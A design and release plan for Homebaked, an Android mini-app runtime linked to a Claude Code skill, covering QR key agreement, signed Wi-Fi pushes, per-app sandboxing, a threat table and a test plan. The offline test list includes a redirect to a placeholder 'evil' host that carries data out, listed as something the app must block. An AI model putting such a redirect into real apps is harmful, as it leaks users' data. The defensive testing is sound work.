# Homebaked: release plan

The plan for taking the personal AliGame setup (`~/dev/android-ali`) and releasing it as
something anyone can use: an Android app plus a Claude Code skill, linked by a QR code,
pushing over Wi-Fi.

> **Name: Homebaked** (decided 2026-10-21, renamed from the working name Homemade). Package
> `app.homebaked`, link scheme `homebaked://`, repo `github.com/alinobrasil/homebaked`. The name
> lives in `android/gradle.properties` (`BRAND_*`) and the constants at the top of
> `skill/homebaked/scripts/homebaked.py`.

---

## Mission

People bake at home to know exactly what goes in. Homebaked lets people make
their own simple apps the same way: **no ads, no intrusive content, no data collection, no
spying.** Every design decision below gets checked against that one sentence.

What follows from it:

- **No accounts, no servers, no cloud.** Nothing to sign into, nothing to breach, no third
  party sitting between your computer and your phone.
- **Offline by default, enforced by the app.** We don't take an app's code on trust. The
  phone app blocks anything that isn't declared.
- **Apps can't see each other.** Private storage per app; sharing is an explicit opt-in.
- **Be honest about the one data flow we can't remove**: building with Claude sends the
  conversation and code to Anthropic. App *usage* data never leaves the phone.

## What ships

| Piece | What it is | Where |
|---|---|---|
| **Android app** | Launcher + runtime for mini-apps; receives pushes over Wi-Fi | `android/`, released as a signed APK on GitHub Releases |
| **Claude Code skill** | Teaches Claude the mini-app spec; links the phone (QR) and pushes apps | `skill/homebaked/`, installed into `~/.claude/skills/` |
| **User guide** | Setup and use, written for non-technical people | `README.md` |

**Supported way to use it: the Code tab of the Claude desktop app** (Mac/Windows/Linux).
Non-technical users don't use a terminal, and the Code tab can show the QR code inline. The
terminal CLI works too but isn't what the guide teaches. **claude.ai chat and the mobile app
can't do this**: skills there run in a cloud sandbox that can't see your Wi-Fi.
(Cowork in the desktop app is untested; see open questions.)

## How it works

```
 Computer: Claude desktop → Code tab                    Phone: Homebaked app
 ───────────────────────────────────                    ───────────────────
 "Link my phone"
   skill: homebaked.py pair
     makes id + 32-byte key, opens a one-shot
     listener, shows QR ──────── camera ────────────▶  scan → "Link ak-laptop?" → Link
                                                         stores key (dev.<id>)
     ◀──────────────── POST /linked (signed) ────────── tells computer its name, IP, port
     saves phone to ~/.config/homebaked/phones.json

 "Make me a tip calculator"
   Claude writes ./tip-calc/index.html per spec
   skill: homebaked.py push tip-calc
     ── POST /upload (HMAC-signed, zip) ─────────────▶  installs, tile appears / app reloads
     if the address is stale: mDNS browse
     _homebaked._tcp → GET /hello (signed) ─────────▶  "that's me"
```

## Decisions and why

| Decision | Why | Instead of |
|---|---|---|
| **Wi-Fi only, phone runs the server** | No accounts, no infrastructure, nothing in the middle. Reuses the proven AliGame push. | Google sign-in + cloud relay (works anywhere, but needs servers and accounts, which goes against the mission) |
| **QR linking, key generated by the computer** | The key reaches the phone through the camera only, never over the network. AliGame's old `/pair` sent the key back over plain HTTP. One scan replaces typing an IP and a token. | Token read off the phone screen |
| **Scanning + Link tap is the consent** | After linking, pushes install with no tap. That's what lets Claude iterate quickly. | A tap per install |
| **Each app on its own origin** `https://<app>.homebaked.internal/` | The browser engine keeps storage separate for free. No more key prefixes. Apps can't read each other's files (`allowFileAccess` off). | Shared `file://` origin (AliGame) |
| **Shared buckets, declared in manifest** (`"shared": ["rewards"]`) | Lets apps cooperate (points in one unlock another) only when both opt in, and only for that bucket. | One global shared space |
| **Network blocked unless declared** (`"network": ["api.x.com"]`) | Claude-written code can still pull a CDN font or analytics snippet out of habit. Enforced by request interception + CSP + WebRTC removal + service-worker block. 🌐 badge on the tile. | Trust the code |
| **Declared hosts get data, never scripts** | An app's code is exactly what you pushed. | Letting CDN scripts in |
| **External links need a tap + confirm** | A page can't smuggle data out by redirecting itself. | Free navigation |
| **On-device speech recognition only** | Android's default recognizer streams audio to a cloud service. Phones without on-device support get "unavailable", not a silent fallback. | `SpeechRecognizer` default |
| **No cloud backup** (`allowBackup=false` + extraction rules) | Mini-app data doesn't go to anyone's cloud. Phone-to-phone transfer still works. | Android auto-backup |
| **ZXing for QR scanning** | Works on any phone, no Google Play services, nothing sent anywhere. Costs one camera permission prompt. | Google's code scanner |
| **Safe Browsing and WebView metrics off** | Both send data to Google; mini-apps are local files. | Defaults |
| **Pushable home screen** (app folder `home`) | Layout changes are a push, not a reinstall. Sandboxed like any app, with a tiny `HomeBridge`; the native bar (status, linking, "use the built-in home screen") stays outside its reach so a broken layout can't lock anyone out. | Changing the layout in Kotlin |
| **None of the AliGame features** (screen dimmer etc.) | Only what every user needs; fewer permissions. The app requests camera (scanning) and microphone (voice input, on first use) only. | Keeping `setDim` and the overlay permission |
| **No catalog / "Get apps" in v1** | Installing other people's code is a different trust model. Personal use first. | AliGame's catalog |
| **No bundled apps** | The release ships empty. People's apps are theirs; the skill suggests ideas instead (`reference/ideas.md`). None of the AliGame mini-apps are included. | Shipping sample apps |
| **Emoji + colour tile icons** (`"emoji"`, `"color"` in manifest) | Claude can't draw PNGs without image libraries; an emoji on a colour looks good and needs nothing. `icon.png` still wins when present. | Requiring `icon.png` |
| **MIT license, personal GitHub account** | Simple and permissive. | GPL; a separate org |
| **Python stdlib for the skill script** | No `pip install`, nothing for a non-technical user to set up. Claude installs Python if missing. | Node package / MCP server |

## Protocol (v1)

### Link QR and key agreement
```
homebaked://link?v=1&id=<computer id>&k=<base64url 32-byte one-time secret>
               &c=<base64url X25519 public key of the computer>&n=<computer name>
               &cb=<ip:port>,<ip:port>&exp=<unix seconds, now+300>
```
- The computer id is stable per computer (`computer.json`), so linking again replaces the
  old entry on the phone.
- Phone rejects expired codes (2 minutes' grace for clock skew), damaged codes, and newer `v`.
  Callback addresses must be private/LAN/Tailscale IPv4: a QR can't make the phone call out to
  the internet.
- On **Link**, the phone makes its own X25519 key pair and both sides derive
  `key = HMAC-SHA256(k, "shell-link-v1" ‖ c ‖ p ‖ X25519(shared))`. **The key never appears in the
  QR code or on the network.** Implemented by hand on both sides (Kotlin `BigInteger`,
  Python ints) because Android only ships X25519 from 13 and Python's stdlib has none;
  the Python one passes the RFC 7748 test vectors, and the two interoperate on the emulator.
- The phone POSTs `http://<cb>/linked` with `{app, version, phone, phoneId, port, pub}`,
  signed `HMAC(key, "linked\n<phoneId>\n<time>\n<sha256(body)>")`. If a firewall blocks it,
  the computer finds the phone by mDNS and fetches the same info from `GET /link?id=<id>`
  (answer signed with the key).

### Signed requests (computer → phone)
Headers `X-Shell-Device`, `X-Shell-Time` (±300s), `X-Shell-Nonce` (16+ hex), `X-Shell-File`
(uploads) and `X-Shell-Sig = HMAC(key, "<verb>\n<name>\n<time>\n<sha256>\n<nonce>\n<file>")`.
Each signature is accepted once; the seen-list is kept on disk, so restarting the app doesn't
reopen a replay window. **Answers are signed too** (`X-Shell-Reply-Sig =
HMAC(key, "reply\n<nonce>\n<status>\n<sha256(body)>")`), and the script checks the phone's
identity with `/hello` before sending any app, so nothing goes to an impostor.

| Call | Verb | Notes |
|---|---|---|
| `GET /hello` | `hello` | `{app, version, phone, phoneId, port}`, used after mDNS discovery |
| `GET /apps` | `apps` | `[{id, name, category, version, network, shared}]` |
| `POST /upload?name=<app>` | `upload` | One multipart file; its hash and file name are signed. `.zip` replaces the app, any other file is merged in. |
| `POST /delete?name=<app>` | `delete` | Removes folder + its origin storage. Shared buckets stay. |
| `GET /link?id=<id>` | (none) | Fallback for a blocked link callback |

The server only answers loopback, private IPv4, Tailscale and IPv6 link-local/ULA addresses.
`409` = computer not linked. App names are DNS labels (`[a-z0-9-]`, max 63) on both sides.

### Discovery
The phone advertises `_homebaked._tcp` (TXT `id=<phoneId>`) via `NsdManager` while it's open.
The skill uses the last known address; when that fails it browses mDNS, verifies each
candidate with a signed `/hello` whose answer must be signed, and updates `phones.json`.

### Bridges
`window.AndroidBridge` (apps): `toast`, `speak(text, lang, rate)`, `stopSpeaking`,
`ttsStatus(lang)`, `listen(lang)` → `window.onSpeechResult(json)`, `stopListening`,
`asrStatus()`, `keepScreenOn(on)` (0.1.1), `sharedGet/sharedSet/sharedRemove/sharedKeys(bucket, …)`. A missing value
comes back as `undefined`, so apps test with `== null`.

`window.HomeBridge` (only the `home` app): `apps()`, `open(id)`, `details(id)`, `toast(msg)`;
`window.onAppsChanged()` is called on changes. Icons are served on the home origin at
`/_apps/<id>/icon`; nothing else of other apps is reachable.

## Security

**Who can push an app to a phone:** only a computer the person linked by scanning its QR code
and tapping **Link**, and only from the same network while Homebaked is open.

| Attack | Result | How |
|---|---|---|
| Stranger on the same Wi-Fi sends an app | Blocked (tested) | Every request needs an HMAC with the 32-byte link key |
| Someone photographs the QR code (over the shoulder, screen share) | Blocked (tested) | The QR holds a one-time secret + public key; the real key comes from an X25519 exchange and also needs the computer's private key, which never leaves it and is deleted after linking |
| Someone records a real push and sends it again | Blocked (tested), even after the app restarts | Single-use signatures + timestamp window, remembered on disk |
| Someone on the network changes a push in transit | Blocked (tested) | Hash, file name and app name are all signed |
| A device pretends to be the phone | Blocked (tested); it receives no app data | Phone answers are signed; identity checked before every upload |
| Attacker on the internet | Not reachable | Server refuses non-local addresses; only runs while the app is open |
| Someone talks you into scanning *their* QR code | **Possible**: their computer could then push apps to your phone when on your Wi-Fi | Link dialog says "only link a computer you own"; History shows every push and its source; Unlink is one tap |
| A pushed app misbehaves | Contained | Own origin, no files of other apps, offline unless declared, no phone permissions beyond mic on request; it can still show a convincing fake screen |
| Malware on the computer | Out of scope | It can do anything the person can, including use Claude |

**Not protected, by design:** pushes travel unencrypted over the LAN, so someone on the same
network could *read* an app's code as it's sent (not change it, not send their own). That's
app code only; what people type into apps never leaves the phone. If it ever matters, the link
key could also encrypt uploads (AES-GCM on the phone; the Python side would need an
encryption library or a hand-written cipher, which is why it isn't done).

## Known limits (say these plainly in the guide)

- **Same Wi-Fi, app open.** No background delivery.
- **Network restrictions.** Guest, hotel, café, airport, school and corporate Wi-Fi usually
  isolate clients, so the phone and computer can't see each other. Some mesh systems and
  VPNs (on either device) do the same. Fallback: computer joins the phone's hotspot.
  mDNS doesn't cross subnets or Tailscale; manual address entry covers those.
- **Desktop firewalls.** First run may prompt to let Python accept connections (the link
  callback). If refused, linking still works; the skill then relies on mDNS (outbound) or the
  address shown on the phone.
- **Android only.** iOS doesn't allow this kind of sideloaded app runtime.
- **Voice input needs Android 12+** with an offline language pack.
- **Threat model.** See Security above. The network blocking stops sloppy and tracking code,
  not a determined attacker writing hostile code; that's fine, the code is your own.
- **Not on Play Store (yet).** Sideloading shows a Play Protect warning. The guide walks through it.

## Test plan

**Linking:** scan with the in-app scanner and with the stock camera app; expired QR; damaged
QR; Cancel; callback blocked by firewall (link still works, mDNS finds it); second computer;
Unlink → next push gets 409 and Claude offers a new QR.

**Push:** new app, update (zip), one-file push, app open during push reloads, delete from
computer, delete from phone (data gone; reinstall starts fresh), name normalization
(`Tip_Calc` → `tip-calc`), phone IP change → rediscovery, port 8080 busy → fallback port.

**Isolation:** two apps writing the same localStorage key don't see each other; shared bucket
works between two apps that declare it; undeclared bucket returns null + toast.

**Offline:** undeclared `fetch`, `<img src=https://…>`, Google Fonts `<link>`, WebSocket,
`RTCPeerConnection`, `navigator.sendBeacon`, service worker registration, `location =
'https://evil?data=…'` without a tap: all blocked. Declared host: fetch works, script from it
does not.

**Devices:** Android 8, 12, 15/16; a Samsung, a Pixel; desktop on Windows 11 (firewall
prompt), macOS (Python install path), Linux.
